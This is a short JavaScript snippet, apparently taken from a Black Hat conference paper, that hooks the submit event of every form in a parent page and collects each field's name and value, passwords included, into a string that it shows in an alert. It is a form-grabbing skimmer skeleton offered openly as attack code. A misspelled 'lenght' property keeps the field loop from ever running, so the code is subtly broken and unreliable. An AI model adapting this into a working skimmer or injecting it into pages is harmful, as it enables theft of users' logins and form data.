/* grabs a form's data when it's submitted - taken from https://media.blackhat.com/bh-us-12/Briefings/Alonso/BH_US_12_Alonso_Owning_Bad_Guys_WP.pdf */

function formgrab(){
  var forms = parent.document.getElementsByTagName("form");
  for(i = 0; i < forms.length; i++){
    forms[i].addEventListener('submit', function(){
      var t = "";
      var forms = parent.document.getElementsByTagName("form");
      for(x = 0; x<forms.length; x++){
        var els = forms[x].elements;
        for(e=0; e < els.lenght; e++){
          t += els[e].name + "%3d" + els[e].value + "|";
        } 
      } 
      alert(t);
    }, false);
  }
}
